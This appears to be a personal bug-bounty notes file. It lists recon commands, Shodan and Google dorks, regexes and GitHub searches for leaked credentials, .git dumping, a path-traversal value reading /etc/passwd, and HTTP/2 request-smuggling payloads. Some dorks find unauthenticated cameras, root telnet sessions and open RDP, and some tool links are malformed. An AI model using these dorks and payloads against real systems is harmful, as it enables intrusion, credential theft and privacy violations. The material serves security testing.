nmap --scripts "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-* -il ./nmap_input.txt
masscan -p1-65535 -il  ./dnsprobe_ip.txt -ol ./masscan_output.txt

     NAABU
    naabu -host url -p8080
    
    MAASSCAN
    masscan ip/24 p80, 443
    masscan ip/24 --top -ports
    

Dangerously fast dns/network/port scanner, all-in-one.        check it more  and also not  yet download
skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenum/dns.txt       


 theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"
    
    
    CENsYS
    check for command line tools 
     check for api-key 
     python3 censys-subdomain.py (url)
     Look for SSL certificate:
    
    
    CHAOS  
    CHECK FOR github to get the api-key to run it
    
      tip  tip
      When you find any cms or any login pannel like phpmyadmin there is always chance for secret files there check out these huge cms wordlist and next time you find any endpoint cms just bruteforce that enpoint  with these wordlist its worth ❤️
https://github.com/p0dalirius/webapp-wordlists/tree/main
    
    
    
    
    
     TIP    tip    important                            https://medium.com/@red.whisperer/sqli-ssrf-and-code-secrets-all-in-one-a387c734c84f
    WHENever  Trufflehog browser extension  found any  subdomain holds a .git directory behind it,  use this tool https://github.com/internetwache/GitTools     to dump all the git dirctory
    
    
    tip
    /.git File Mass Hunting 👇

cat alivesubs.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
    
    
    
    
    SOURCE CODE REVIEW TOOLS / AUDITING TOOL
    https://github.com/wireghoul/graudit
   
   
   
   tip
   

     
       
 check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
 ./cruze.sh example.com
 
 tips  
 LEAKED CREDENTIALS         https://github.com/h4x0r-dz/Leaked-Credentials/
 
 To search for leaked credentials using Google Chrome's Developer Tools and regex, follow these short steps:
Open DevTools: In Chrome, navigate to the site you're inspecting, then open Developer Tools with Ctrl+Shift+I (Windows/Linux) or Cmd+Option+I (macOS).
Go to Network Tab: Click on the "Network" tab.
Enable Regex Search: Click the regex icon in the filter bar to enable regex mode.
Refresh Page: Refresh the page to load all network requests.
Apply Regex: Paste the given regex into the filter bar to search for patterns indicating leaked credentials.
     
((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]

then Review Matches: Manually inspect the filtered requests to identify potential leaks.


USING BURP
 To search for leaked credentials in your target's scope using Burp Suite:

Launch Burp Suite: Start Burp Suite and configure your browser to route traffic through it.
Browse Your Target: Navigate through your target site and its subdomains to capture traffic in Burp Suite.
Use the Regex in Search:
Go to the "Burp" > "Search" tab.
In the search type, choose "Regular expression".
Paste the following regex:
  (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]



  
  
  JAVASCRIPT-FILE-FOR-BUG-HUNTERS
  Manual Checking JavaScript:
  
   developer tools, --> HTML source code. Look for JavaScript references within the HTML file, which are often included using <script> tags. You can click on these references to view the JavaScript code  0r network tab-- > sourc file  --> open 
   
 ***  Make sure you set up your burp proxy and keep it running in background. Take a deep dive into your target, thoroughly examining all its features and endpoints. Once you’re done, head over to the proxy tab and configure the filters as shown below to capture all the JavaScript files which are  scripts, shown only in scope items, and shown only js . Don’t forget to copy all the results and save them in a file called “link.txt”.   then run 
            wget -P jsfiles -i link.txt    
            all keywords manually “api key, api_key, password, secret, token, access, pwd, url, config, aws, s3” etc.  check and use the below regex
         regix =  https://github.com/l4yton/RegHex
         validate keys =  https://github.com/streaak/keyhacks
         https://github.com/dirtycoder0124/formcrawler   ----> This script Crawls the website and finds the URLs that contain html forms.
  
  with tools
  cat target.txt | gau | grep ".js" | tee js.txt
cat target.txt | waybackurls | grep ".js" | tee -a js.txt
cat target.txt | subjs | httpx -mc 200 | tee -a js.txt
cat js.txt | Mantra
cat js.txt | while read url;do python3 SecretFinder.py -i $url -o cli ; done > endpoint
nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -o js_bugs.txt

bash JSFScan.sh -l target -all -r -o result.ru

  
 
 pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
 
 Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
 
 
 onliner to extract endpoints from JS files of a given host
 ./js at my kali/scan/
 


     
                                                  
keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.


 getting javasacript files
 source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 

    waybackmachine
ttps://web.archive.org/web/*/facebook.com/*
.zip
.backup
.config
.csv
.pdf
/api
/admin/
grep "\.txt"
~ "\.log"
~ "\.cache"
~ "\.secret"
~ "\.db"
~ "\.backup"
~ "\.yml"
~ "\.json"
~ "\.gz"
~ "\.rar"
~ "\.zip"
~ "\.config"     


     tip
     You do not need fresh assets, you need to check functionalities and try to register by company's mail and do not forget email discovery like redteamers, sometimes it helps you😉 be hacker not hunter
  If we assume the company name is test, you register as admin@test.com This is an example, check for dev, stage and etc
      
       

     Directory Bruteforcing / content discovery
     
     dirb tesla.com (wordlist)


# bruteforcing url and excluding status code (e.g. 302)
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b 302

gobuster dns -d mysite.com -t 50 -w subdomains.txt
gobuster vhost -u https://mysite.com -t 50 -w subdomains.txt
gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/web-content/directory-list-2.3-medium.txt

fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt
 fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt ml 200, 301






finding files
gobusster dir -u (url) -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -x,html,css,.js
fuff -u (url)/fuzz  -w /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -e .html,.css,.js.conf

Vhost enumeration
fuff -u (url)  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST:FUZZ.EXAMPLE.COM"
gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
    


      whoxy.com   //asset discovery  for root domain

Perform reverse DNS lookups on the IP’s you discover through these search engines and see if you can identify IPs, ASN’s, root domains, or other unlinked company owned assets. (shodan , censys, and whoxy.com)


Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.com Org: google ssl:Google



     SHODAN FOR BUG HUNTING 
     assest discovery using shodan cli                   check nahamesec video on shodan
     
     tip
     1 to get your IPs for shordan dork 
{sudo shodan download --limit 1000 myresults.json.gz 'DORK'}
2 to print the & filter the results to live
sudo shodan parse --fields ip_str,port --separator " " myresults.json.gz | awk '{print$1":"$2}' | httpx -o live-IPs.txt
     
     ssl:redacted.com "200"
     
 shodan init api-key
     shodan domain -h
     shodan domain -D url -S
     shodan jq -r '.hostnames' (filename)
     shodan jq -cs '.[0] (filename) | jq -r
     shodan jq -r '.ip_str' (filename) | httpx -titles  -port 443,80,8080              \\ ip address of the domain name
     shodan search org:\"ford motors\" | --fields ip_str, port,http.title
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title                     being creative with your search  || \!port:80,443 this means dont show 
       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :"
        shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei                         pass to other tools
         shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei  | httpx -title -follow-host-redirect   
         
          shodan search search ssl:form.com  --fields ip_str, port,http.title | awk '{print $1, $2}' | tr " " " : "
         shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser   
          shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser | sort u | xargs -I{} shodan search ssl:{} -fields ip_str,port
          
          shodan search org:target.com hostnames:localhost
         
     
https://www.shodan.io/search?query=ssl%3A%22Paypal%22

https://www.shodan.io/search?query=ssl%3A%22Paypal%22+200

You can also negative search for specific content you don’t wish to search for by append — in our query followed by the pattern.
https://www.shodan.io/search?query=org%3A%22Amazon%22+ssl%3A%22Paypal%22
https://www.shodan.io/search?query=http.component%3A%22jenkins%22
https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22


   Some Shodan Dorks that might useful in Bug Bounty. 
ssl:example.com http.status:200 http.title:”setup”                                 ssl:example.com http.status:200 -http.title:“Authorization required”
1. org:"http://target. com" 
2. http.status:"<status_code>" 
3. product:"<Product_Name>" 
4. port:<Port_Number> “Service_Message” 
5. port:<Port_Number> “Service_Name” 
6. http.component:"<Component_Name>" 
7. http.component_category:"<Component_Category> 
8. http.waf:"<firewall_name>" 
9. http.html:"<Name>" 
10. http.title:"<Title_Name>" 
11. ssl.alpn:"<Protocol>" 
12. http.favicon.hash:"<Favicon_Hash>" 
13. net:"<Net_Range>" (for e.g. 104.16.100.52/32) 
14. http://ssl.cert.subject.cn:"<http://Domain .com>" 
15. asn:"<ASnumber>" 
16. hostname:"<hosthame>" 
17. ip:"<IP_Address>" 
18. all:"<Keyword>" 
19. “Set-Cookie: phpMyAdmin” 
20. “Set-Cookie: lang=" 
21. “Set-Cookie: PHPSESSID" 
22. “Set-Cookie: webvpn” 
23. “Set-Cookie:webvpnlogin=1" 
24. “Set-Cookie:webvpnLang=en” 
25. “Set-Cookie: mongo-express=" 
26. “Set-Cookie: user_id=" 
27. “Set-Cookie: phpMyAdmin=" 
28. “Set-Cookie: _gitlab_session” 
29. “X-elastic-product: Elasticsearch” 
30. “x-drupal-cache” 
31. “access-control-allow-origin” 
32. “WWW-Authenticate”  
33. “X-Magento-Cache-Debug”   
34. “kbn-name: kibana”


SHODAN DORK:    for uselessness    
webcamXP/webcam7:
("webcam 7" OR "webcamXP") http.component:"mootools" -401

Some Webcams(SQ Webcams?):
Server: SQ-WEBCAM

Yawcam Webcams:
"Server: yawcam" "Mime-Type: text/html"

Surveillance Cams:
Server: uc-httpd 1.0.0
NETSurveillance uc-httpd
Surveillance cams with admin:admin or admin:(none) creds

Hikvision Cameras:
product:"Hikvision IP Camera"
Link for Hikvision backdoor here: https://ipvm.com/reports/hik-exploit

Generic dork for finding cameras:
title:camera

Generic dork for finding cameras (with screenshots):
webcam has_screenshot:true

Dahua Cameras:
http.title:"WEB VIEW"

Some random webcams:
http.title:"Webcam"

Vulnerable Services / Servers

EternalBlue SMB RCE:
os:"Windows 10 Home 19041

ProFTPD 1.3.5 (mod_copy exec; CVE-2015-3306) :
"220 ProFTPD 1.3.5"

Anonymous FTP Login #1:
"230 User anonymous"

Anonymous FTP Login #2:
"220" "230 Login successful." port:21

Already Logged-In as root via Telnet:
"root@" port:23 -login -password -name -Session

No password for Telnet Access:
port:23 console gateway

Other Services that you can find

OpenSSH:
openssh port:22

Logitech Media Servers:
"Server: Logitech Media Server" "200 OK"

Jenkins Unrestricted Dashboard:
x-jenkins 200

MySQL:
"product:MySQL"

MongoDB #1:
mongodb port:27017

MongoDB #2:
product:"MongoDB"

Interesting Things that you can find on Shodan

RDP/VNC's WITHOUT AUTH:
"authentication disabled" "RFB 003.008"
remote desktop "port:3389"

XZERES Wind Turbines:
title:"xzeres wind"

title:"IP CAMERA Viewer" Content-Length: 703

MikroTik Routers:
port:8291 os:"MikroTik RouterOS 6.45.9"

Minecraft Servers:
"Minecraft Server" "protocol 340" port:25565

Smart TVs:
"Chromecast:" port:8008

Maritime Satellites:
"Cobham SATCOM" OR ("Sailor" "VSAT")
Real-time location of ships via satelite

Tesla PowerPack Charging Status Page:
http.title:"Tesla PowerPack System" http.component:"d3"

Samsung Electronic Billboards:
"Server: Prismview Player"





              GOOGLE DORKS
              
          Google dorking tip, if you see an interesting subdomain, don't be afraid to query it by itself in google :)
for example, site:interesting.subdomain.com ext:txt
              
Broad domain search w/ negative search
site:example.com -www -shop -share -ir -mfa

 site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
 
 inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
 
 
 
  GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
 

ext:php inurl:? site:example[.]com


ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess site:example[.]com


"http://Target.com" language:yml 
"Target. com" language:yml "_key"
"Target. com" language:yml "admin"
"Target. com" language:yml "root"
"Target. com" language:yml "host"


PHP extension w/ parameters
site:example.com ext:php inurl:?
 intitle: index X of inurl: backup
 inurl:index.php.bak
 filetype:xls inurl:1 xls0
 site:anu.edu inurl:admin
 intitle:index of "apache/1.3.27 server at
 inurl:ws_ftp.log
 intitle:index of inurl:admin 

Disclosed XSS and Open Redirects
site:openbugbounty.org inurl:reports intext:"example.com"

Juicy Extensions
site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess

XSS prone parameters
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com

Open Redirect prone parameters
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com

SQLi Prone Parameters
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com
  site:redacted.com inurl:id=

SSRF Prone Parameters
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com

LFI Prone Parameters
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com

RCE Prone Parameters
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com



📝Find endpoints for RCE testing

Tip by : taksec

High % inurl keywords
inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php site:example[.]com

Sensitive Parameters
inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:& site:example[.]com

API Docs
inurl:ap
cs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:"example[.]com"

Code Leaks
site:pastebin.com "example.com"

site:jsfiddle.net "example.com"

site:codebeautify.org "example.com"

site:codepen.io "example.com"

Cloud Storage
site:s3.amazonaws.com "example.com"

site:blob.core.windows.net "example.com"

site:googleapis.com "example.com"

site:drive.google.com "example.com"

site:dev.azure.com "example[.]com"

site:onedrive.live.com "example[.]com"

site:digitaloceanspaces.com "example[.]com"

site:sharepoint.com "example[.]com"

site:s3-external-1.amazonaws.com "example[.]com"

site:s3.dualstack.us-east-1.amazonaws.com "example[.]com"

site:dropbox.com/s "example[.]com"

site:box.com/s "example[.]com"

site:docs.google.com inurl:"/d/" "example[.]com"

JFrog Artifactory
site:jfrog.io "example[.]com"

Firebase
site:firebaseio.com "example[.]com"

File upload endpoints
site:example.com ”choose file”

Dorks that work better w/o domain
Bug Bounty programs and Vulnerability Disclosure Programs
"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone"

  site " bug bounty"
  site:ch inurl:security.txt "bounty"

Apache Server Status Exposed
site:*/server-status apache

WordPress
inurl:/wp-admin/admin-ajax.php

Drupal
intext:"Powered by" & intext:Drupal & inurl:user

Joomla
site:*/joomla/login

Google Dork - Open Redirects
inurl:(url= | return= | next= | redirect= | redir= | ret= | r2= | page=) inurl:& inurl:http site:example[.]com



Dork: intitle:"index of" "database.sql"




   
Github For Recon 

path:**/.env AWS_ACCESS_KEY_ID
DB_PASSWORD=
path:*.sql "CREATE TABLE" AND "INSERT INTO
 path:**/.properties api_key
path:**/docker-compose.yml MYSQL_ROOT_PASSWORD
language:javascript jwt_secret OR jwt_key
path:*.pem private  
path:*.pub "ssh-rsa" 
 
"http://Target.com" language:yml 
"Target. com" language:yml "_key"
"Target. com" language:yml "admin"
"Target. com" language:yml "root"
"Target. com" language:yml "host"

api_key
authorization_bearer:
authentication
auth
token
client_secret
secret
private_key
username
api_token
client_id
password
user_pass
user_password
OTP
DB_DATABASE=
DB_PASSWORD=
DB_PW=
DB_USER=dotfiles
filename:sftp-config.json password
filename:.s3cfg
filename:config.php dbpasswd
filename:.bashrc password
filename:.esmtprc password
filename:.netrc password
filename:_netrc password
filename:.npmrc _auth
filename:WebServers.xml
filename:sftp-config.json
filename:.esmtprc password
filename:passwd path:etc
filename:prod.secret.exs
filename:sftp-config.json
filename:proftpdpasswd
filename:travis.yml
filename:vim_settings.xml
filename:sftp.json path:.vscode
filename:secrets.yml password




search for token,key, secret, password
search?q={COMPANY_NAME}-&type=Users
"Company name" send_keys or sendkeys
"company.com" "dev"
"dev.company.com"
"company.com" API_key
"company.com" password
"api.company.com" authorization
TIP:
1- check those dorks in github, you will always find somthing interesting 
"Company name" language:python
"Company name" language:bash
2- keep monitoring js files for changes to find new endpoints
3- bruteforce and search for hiddin js files other that whats called in app.

*"target(.)com" password
*"target(.)com" "pass" 'email'
*"target(.)com" "api"
*"target(.)com" FTP
*"target(.)com" SMTP
*"target(.)com" LDAP
*"target(.)com" PEM (For Keys)
Try to remove the (.)com and do the same thing. 
Big domains? Give spaces between them, like "target xyz" and do the 


         tip
Perform dirsearch for all subdomains
JSParser -  for reading javascript files
extracting links from JS file LinkFinder(https://github.com/GerbenJavado/LinkFinder) - extracting endpoints from JS files
Check robots.txt page

 END End 



 
 BOKEN LINK HIJACKING
Manually find and click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link)

While Doing Manual work also put broken-link-checker in background using below Command interminal.

blc -rof --filter-level 3 https://example.com/
Ouput will be like Something.
─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)
Now you need to check if company has the page or not , if no then register as the company or try to get that username or url.
   
   
   BURP SUITE COOK BOOK
   BROKEN ACCESS CONTROL  
   ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
   
   TEASTE FOR BROWERS CACHE WEAKNESS , this is by loginin and also log out  of you appilcation and then click the browers back botton to verify if you could login
   
   changing the usid of the user and also changing the application name to admin could lead to privilage esccalation
   
   check for IDOR of the login page/ source page  by changing the upload-file.php to ../../../../etc/passwd
   
   session fixation ->  using the comparer tool in burp to show/  chcek  the  session cookie of an browers session cookie when not login and when login   
  
  testing for expose -session varaibles-> try to change application roles to admin , it manyatimes exposes the hidden fleid of an appliction    //change from user to admin
  
  when running an unathenticated testing of a web app, check for web app poinsoing in the post request  and check if the content type is returning index.html/text .html
  
  /// thread checking /////
  always check for business thread issues when testing apps shopping cart thereby intercepting the cart request and makng changing of amout of goods or price of goods. and then copy burp new request to the browers and check if the could buy at the same amount with the previous request.. 
  
  
  
  
  
  
  tools for subdomain 
  amass
  findomain
  subfinder
  sublist3r
  assetfinder
  bbot
  
  for port scanning
  naabu
  masscan
  nmap
  skanuvaty 
  
  director bruteforce
  gobuster
  fuff
  dirb
  
  xss bruteforce
  qsreplace
  xss-vibes
  
  sensitive discovery in js files
  SecretFinder.py
  photon
  
   
  
   TOOLS FOR PARAMters spidering of url
   arjun
   paramspider
   katana 
   hawkrawler
   gosipder
   
   filtering out live domain
   httpx
   httprobe
   
 
   
  tools for  geting  way backurl
  waybackurl
  gau
  photon
  
    tools for  SUBDOMAIN TAKEOVER
     Hostilesubruteforce
     ruby sub-brute.rb
     sub404
     python3 sub404.py  -f
      subjack
       https://github.com/sarveshkapre/subdomain_takeover
       subzy
      
     tools for  asset discory
     crt.sh
     cenys
     shodan
      
  
    FOOTPRINTING WEBSITES 
      whatweb (url) -v a4
      osint framwork.com
     netcratf.com
     securityheaders.com
     Dnsdumster.com
     whois.com
     mxtoolbox.com
     emkel.c2       //// fakemails 
     
     visual recon 
     gowitness
     https screenshoot
        
        
        
        
        
       TIP   TIP
       Tips


Look into subdomains that allow sign-in with Google, as they may contain sensitive information accessible only to team members. 

Dork: site:*.example.com inurl:login | inurl:signin Google

You might uncover subdomains that let you log in with personal Gmail accounts,
        
        
        tip
        Cache purge requests are not authenticated.

→ curl -X PURGE https://target[.]evil[.]com

→ curl -s -D - https://target[.]evil[.]com -o /dev/null
        
        
        
           
   TOOLS TO CHECK ON  
   subdomain_takeover         https://github.com/sarveshkapre/subdomain_takeover
   XSS-Automation-Tool        https://github/EmperialX/Xss-automation-Tools    
   URL-hunter                 https://github/SecuritySphinx/Url-hunter
   ParamAngler                https://spyx/ParamAngler  
   pytractor                  https://Noll101/pytrator
   w3af.org
   X-Recon                    https://joshkar/X-recon
   jsfinder                   https://kacakb/jsfinder
   Lfi-space                  https://capture0x
   klyda                      https://Xeonrx       dictionary spray
  
  
  TIPS
  
  Scan each individual IP address associated with their subdomains and having the output saved to a file  &&
CHECK FOR OPEN PORT TOOLS, PORT COMMONLY USED 80, 441, 81   &&
Look for any services running on unusual ports or any service running on default ports which could be vulnerable (FTP, SSH, etc). Look for the version info on services running in order to determine whether anything is outdated and potentially vulnerable

    tip
    
# Download all js urls and merge together and finally grep on:
wget --no-check-certificate -i js.txt
cat file1.js file2.js file3.js file4.js file5.js > all_js.js
cat all_js.js | grep -r -E # Similar to the grep above...
           RUN
nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt


  tip  tip
  gathering all target endpoints
filter the results just for pic extensions
(cat endpoints.txt | egrep 'jpg|jpeg|png' > results.txt)

  found a passport on specific endpoint ==> app[.]com/xxxx/cdn/file/xxx.jpg 

visit app[.]com/xxxx/cnd/ ==> dir listing open

and the results is tons of PII🤠
don't forget checking (jpg/jpeg/etc..) all the time


  tip
  1/ 
Mass hunting exposed git with hednsextractor:

  1⃣    tools: hednsextractor + httpx + Dotgit Plugin

2⃣     hednsextractor -target "your target" -silent | httpx -path /.git/config -status-code -ms 200 -silent
(filter param with status conde and ms param)
   https://t.co/iEkaJAO6qV







   
           
           HTTP REQUEST SMUGGLING      HTTP REQUEST SMUGGLING         HTTP REQUEST SMUGGLING
           https://portswigger.net/research/browser-powered-desync-attacks
           https://github.com/anshumanpattnaik/http-request-smuggling
           methodology      https://medium.com/@rcxsecurity/http-request-smuggling-wwwwwh-85be9c46a38e
    this occurs when the front end processes the Content-Length header, and the back end processes the Transfer-Encoding header
    https://itsfading.github.io/posts/I-owe-your-Request-HTTP-Request-Smuggling-leads-to-Full-Accounts-takeover/
    https://honoki.net/2020/02/18/http-request-smuggling-5-practical-tips/
    https://portswigger.net/web-security/request-smuggling/finding
    https://www.intruder.io/research/practical-http-header-smuggling
    https://blog.jeti.pw/posts/knocking-on-the-front-door/
    https://github.com/BishopFox/h2csmuggler
    https://kleiton0x00.github.io/posts/Exploiting-HTTP-Request-Smuggling-(TE.CL)-XSS-to-website-takeover/
    https://infosecwriteups.com/get-paid-by-smuggling-the-legal-way-c31805de3c59
    https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/
    
    
    Detect
The obvious approach to detecting request smuggling vulnerabilities is to issue an ambiguous request followed by a normal 'victim' request, then observe whether the latter gets an unexpected response. However, this is extremely prone to interference; if another user's request hits the poisoned socket before our victim request, they'll get the corrupted response and we won't spot the vulnerability. This means that on a live site with a high volume of traffic it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process. Even on a site with no other traffic, you'll risk false negatives caused by application-level quirks terminating connections.
  
    Exploiting
To exploit HTTP Request Smuggling Vulnerability you may have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:
    
    
    
    
    
    
     TIP ON HTTP2                     
     https://portswigger.net/research/http2
     
     H2.CL Desync
     check if the frontend end request is downgraded to  http1  when parse request
     
     :method	POST
:path	/n
:authority	www.netflix.com
content-length	4
abcdGET /n HTTP/1.1
Host: 02.rs?x.netflix.com
Foo: bar
                                
                             after the frontend downgraded the request   it hit the back-end looking something like:
                             
                             POST /n HTTP/1.1
              Host: www.netflix.com
               Content-Length: 4

                   abcdGET /n HTTP/1.1
               Host: 02.rs?x.netflix.com
             Foo: bar
     
     
    
    
     H2.TE Desync on Application Load Balancer
    :method	POST
:path	/identitfy/XUI
:authority	id.b2b.oath.com
transfer-encoding	chunked
0

GET /oops HTTP/1.1
Host: psres.net
Content-Length: 10

x=

                  the frontend downgraded the request
                  The front-end downgraded this request into:

  POST /identity/XUI HTTP/1.1
  Host: id.b2b.oath.com
  Content-Length: 66
  Transfer-Encoding: chunked

0

   GET /oops HTTP/1.1
  Host: psres.net
  Content-Length: 10

x=

                 
